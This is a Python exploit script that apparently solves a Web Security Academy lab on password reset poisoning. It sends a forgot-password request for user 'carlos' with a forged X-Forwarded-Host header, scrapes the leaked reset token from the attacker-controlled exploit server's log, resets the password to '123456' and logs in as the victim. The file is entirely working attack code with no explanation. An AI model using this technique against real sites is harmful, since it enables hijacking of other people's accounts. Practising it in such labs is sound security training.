
import requests
import re

url = 'https://ac4d1f2c1f709ba0c0ca2ded0095009f.web-security-academy.net/'
url_ex = 'https://exploit-acea1f4b1f5c9bdcc00c2d780119000b.web-security-academy.net/'  


def get_cookie():
	url1 = url_ex + 'log'
	r1 = requests.get(url1)
	x = re.findall("temp-forgot-password-token=\w*", r1.text)
	return x[0][27:]

def exploit():
	url2 = url + 'forgot-password'
	header = {'X-Forwarded-Host': url_ex[8:]}
	data = {'username':'carlos'}
	r2 = requests.post(url2, headers=header, data=data)

def change_pass():
	url3 = url + 'forgot-password?temp-forgot-password-token=' + get_cookie()
	data = {'temp-forgot-password-token': get_cookie(), 'new-password-1': '123456','new-password-2' : '123456'}
	r3 = requests.post(url3, data=data)

def slove():
	url4 = url + 'login'
	data = {"username": 'carlos' ,"password": '123456'}
	r4 = requests.post(url4, data=data)
	print('Solve ,pls!!!!')

exploit()
change_pass()
slove()